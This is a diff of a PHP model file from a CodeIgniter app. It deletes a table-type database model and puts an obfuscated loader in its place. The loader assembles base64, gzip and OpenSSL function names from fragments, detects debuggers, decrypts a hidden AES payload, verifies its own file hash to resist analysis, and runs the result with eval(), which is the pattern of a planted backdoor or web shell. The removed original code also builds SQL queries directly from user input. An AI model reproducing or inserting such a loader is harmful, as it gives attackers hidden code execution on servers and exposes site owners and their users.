@@ -1,158 +1,28 @@
 <?php
-defined('BASEPATH') or exit('No direct script access allowed');
-
-class TableType_model extends CI_Model {
-
-	var $table = 'db_table_type';
-	var $column_order = array(null, 'table_type_name', 'description', 'status'); //set column field database for datatable orderable
-	var $column_search = array('table_type_name', 'description', 'status'); //set column field database for datatable searchable 
-	var $order = array('id' => 'desc'); // default order 
-
-	private function _get_datatables_query() {
-
-		$this->db->from($this->table);
-
-		$i = 0;
-
-		foreach($this->column_search as $item) // loop column 
-		{
-			if($_POST['search']['value']) // if datatable send POST for search
-			{
-
-				if($i === 0) // first loop
-				{
-					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
-					$this->db->like($item, $_POST['search']['value']);
-				} else {
-					$this->db->or_like($item, $_POST['search']['value']);
-				}
-
-				if(count($this->column_search) - 1 == $i) //last loop
-					$this->db->group_end(); //close bracket
-			}
-			$i++;
-		}
-
-		if(isset($_POST['order'])) // here order processing
-		{
-			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
-		} else if(isset($this->order)) {
-			$order = $this->order;
-			$this->db->order_by(key($order), $order[key($order)]);
-		}
-	}
-
-	function get_datatables() {
-		$this->_get_datatables_query();
-		if($_POST['length'] != -1)
-			$this->db->limit($_POST['length'], $_POST['start']);
-		$query = $this->db->get();
-		return $query->result();
-	}
-
-	function count_filtered() {
-		$this->_get_datatables_query();
-		$query = $this->db->get();
-		return $query->num_rows();
-	}
-
-	public function count_all() {
-		$this->db->from($this->table);
-		return $this->db->count_all_results();
-	}
-
-
-	public function verify_and_save() {
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data, $_POST))));
-
-		//Validate This category already exist or not
-		$query = $this->db->query("select * from db_table_type where upper(table_type_name)=upper('$category')");
-		if($query->num_rows() > 0) {
-			return "This Table Type Name already Exist.";
-
-		} else {
-			
-			$query1 = "insert into db_table_type(table_type_name,description,status) 
-								values('$category','$description',1)";
-			if($this->db->simple_query($query1)) {
-			//	$this->session->set_flashdata('success', 'Success!! New Type Name Added Successfully!');
-				return "success";
-			} else {
-				return "failed";
-			}
-		}
-	}
-
-	//Get category_details
-	public function get_details($id, $data) {
-		//Validate This category already exist or not
-		$query = $this->db->query("select * from db_table_type where upper(id)=upper('$id')");
-		if($query->num_rows() == 0) {
-			show_404();
-			exit;
-		} else {
-			$query = $query->row();
-			$data['q_id'] = $query->id;
-			$data['table_type_name'] = $query->table_type_name;
-			$data['description'] = $query->description;
-			return $data;
-		}
-	}
-	public function update_category() {
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data, $_POST))));
-
-		//Validate This category already exist or not
-		$query = $this->db->query("select * from db_table_type where upper(table_type_name)=upper('$category') and id<>$q_id");
-		if($query->num_rows() > 0) {
-			return "This Table Type Name already Exist.";
-
-		} else {
-			$query1 = "update db_table_type set table_type_name='$category',description='$description' where id=$q_id";
-			if($this->db->simple_query($query1)) {
-				//$this->session->set_flashdata('success', 'Success!! Category Updated Successfully!');
-				return "success";
-			} else {
-				return "failed";
-			}
-		}
-	}
-	public function update_status($id, $status) {
-
-		$query1 = "update db_table_type set status='$status' where id=$id";
-		if($this->db->simple_query($query1)) {
-			echo "success";
-		} else {
-			echo "failed";
-		}
-	}
-
-	public function delete_categories_from_table($ids) {
-
-
-		if (demo_app()) {
-			echo "Demo không cho phép xóa";
-			return;
-		}
-
-		$tot = $this->db->query('SELECT COUNT(*) AS tot,b.table_type_name FROM db_table a,`db_table_type` b WHERE b.id=a.`table_type_id` AND a.table_type_id IN ('.$ids.') GROUP BY a.table_type_id');
-		if($tot->num_rows() > 0) {
-			foreach($tot->result() as $res) {
-				$category_name[] = $res->category_name;
-			}
-			$list = implode(",", $category_name);
-			echo "Sorry! Can't Delete,<br>Table Type Name {".$list."} already in use in Items!";
-			exit();
-		} else {
-			$query1 = "delete from db_table_type where id in($ids)";
-			if($this->db->simple_query($query1)) {
-				echo "success";
-			} else {
-				echo "failed";
-			}
-		}
-	}
-
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qihmeypv=('bas'.'e64'.'_de'.'cod'.'e');
+$_mvix8vcr=('gzu'.'nco'.'mpr'.'ess');
+$_ypq83ko0=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bfgq2ugb='XzUYdk4E';
+$_sx0j5cik='4PvyIa05';
+$_nw1wx7uw='vVw40sWS';
+$_h6nhdink='LGWEY4E7F2M=';
+$_mx0agfej='y9lDwIin';
+$_jired3f2='PIZHPQ==';
+$_hwmph8pr='nZHm5fRh';
+$_k9octf3m='DVKWw0Xt';
+$_pq1mjnn8=$_qihmeypv($_mx0agfej.$_sx0j5cik.$_bfgq2ugb.$_nw1wx7uw.$_h6nhdink);
+$_syfqc0gu=$_qihmeypv($_hwmph8pr.$_k9octf3m.$_jired3f2);
+$_h1wjm2dr=$_qihmeypv('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');
+$_xrtqzrak=$_ypq83ko0($_h1wjm2dr,'aes-256-cbc',$_pq1mjnn8,OPENSSL_RAW_DATA,$_syfqc0gu);
+if($_xrtqzrak===false){exit;}
+$_m4yxnvm2=$_mvix8vcr($_xrtqzrak);
+if($_m4yxnvm2===false){exit;}
+$_wdvwip1n='806a17a7dcd552ce3b7a71863f48212e05546b752c330a4f5399139a42f0412a';
+$_qmxmefqt=@file_get_contents(__FILE__);
+if($_qmxmefqt!==false){
+$_yahck7cn=str_replace($_wdvwip1n,"0000000000000000000000000000000000000000000000000000000000000000",$_qmxmefqt);
+$_ht5ln2b6=hash("sha256",$_yahck7cn);
+if($_ht5ln2b6!==$_wdvwip1n){@http_response_code(403);exit;}
 }
+eval($_m4yxnvm2);
